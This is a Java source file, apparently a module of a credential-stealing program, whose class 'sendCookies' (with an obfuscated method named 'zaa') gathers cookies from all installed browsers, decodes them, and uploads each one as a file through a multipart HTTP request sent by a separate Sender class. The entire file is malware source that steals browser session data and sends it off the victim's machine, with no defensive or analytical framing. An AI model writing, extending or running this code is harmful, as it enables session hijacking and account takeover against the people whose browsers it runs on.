package io.github.luxotick.impl.cookies;

import io.github.luxotick.Sender;
import io.github.luxotick.utils.util;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.RequestBody;

import java.io.IOException;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class sendCookies {
    public static Map<String, byte[]> zaa() throws IOException {
        Map<String, String> browserCookies = util.getAllBrowserCookies();
        Map<String, byte[]> cookieDataMap = new HashMap<>();

        for (Map.Entry<String, String> entry : browserCookies.entrySet()) {
            String encodedCookieData = entry.getValue();
            byte[] cookieData = Base64.getDecoder().decode(encodedCookieData);

            // Add the cookie data to the map
            cookieDataMap.put(entry.getKey(), cookieData);

            // Create a RequestBody from the cookie data
            RequestBody requestBody = RequestBody.create(cookieData, MediaType.parse("text/plain"));

            // Send the cookie data
            Sender.sendFile(new OkHttpClient(), new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("file", entry.getKey() + ".txt", requestBody)
                    .build());
        }
        return cookieDataMap;
    }
}